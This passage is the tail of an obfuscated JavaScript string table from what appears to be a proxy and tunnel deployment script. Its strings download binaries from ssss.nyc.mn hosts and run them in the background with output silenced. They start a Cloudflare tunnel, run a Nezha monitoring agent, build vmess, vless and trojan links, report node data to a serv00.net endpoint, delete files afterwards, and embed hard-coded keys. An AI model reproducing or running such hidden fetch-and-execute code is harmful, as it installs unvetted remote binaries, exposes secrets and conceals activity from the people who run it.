toupdate\x20--protocol\x20http2\x20run\x20--token\x20','status','readFileSync','https://arm64.ssss.nyc.mn/web','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','/dev/null','&path=%2Ftrojan-argo%3Fed%3D2560#','SERVER_PORT','\x20is\x20running','send','table','data','clear','http\x20server\x20is\x20running\x20on\x20port:','text/plain;\x20charset=utf-8','bind','(((.+)+)+)+$','true','\x20-c\x20\x22','ARGO_DOMAIN:','4LTiNJU','split','https://amd64.ssss.nyc.mn/bot','abcdefghijklmnopqrstuvwxyz','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','boot.log','none','util','Error\x20in\x20startserver:','Error\x20downloading\x20files:','127.0.0.1','php\x20running\x20error:\x20','\x20is\x20created','\x0a\x20\x20credentials-file:\x20','2243898BSLXzK','tunnel.json','join','/vmess-argo','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','\x20-p\x20','unshift','5nEEKJb','jianxianapp','\x20>/dev/null\x202>&1','Download\x20','basename','platform','exec','?encryption=none&security=tls&sni=','readdirSync','push','&path=%2Fvless-argo%3Fed%3D2560#','del\x20/f\x20/q\x20','writeFileSync','&fp=firefox&type=ws&host=','/api/delete-nodes','2053','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','\x20>\x20nul\x202>&1','8WCzCdu','mkdirSync','phala.jianxian.nyc.mn','\x20>/dev/null\x202>&1\x20&','704570mjTHxk','error','NEZHA_PORT','OFYPZJ6hEEHEDvJa2LuaDJNQBqincIbu','has','0c524a06-80a4-4cb2-809a-8751c7ee4000','Phala','info','https://oooo.serv00.net/add-url','nohup\x20','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','SUB_PATH','UPLOAD_URL','then','8443','arch','https://amd64.ssss.nyc.mn/v1','console','firefox','env','web\x20running\x20error:\x20','existsSync','catch','vmess','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!'];_0x2145=function(){return _0x4aa871;};return _0x2145();}
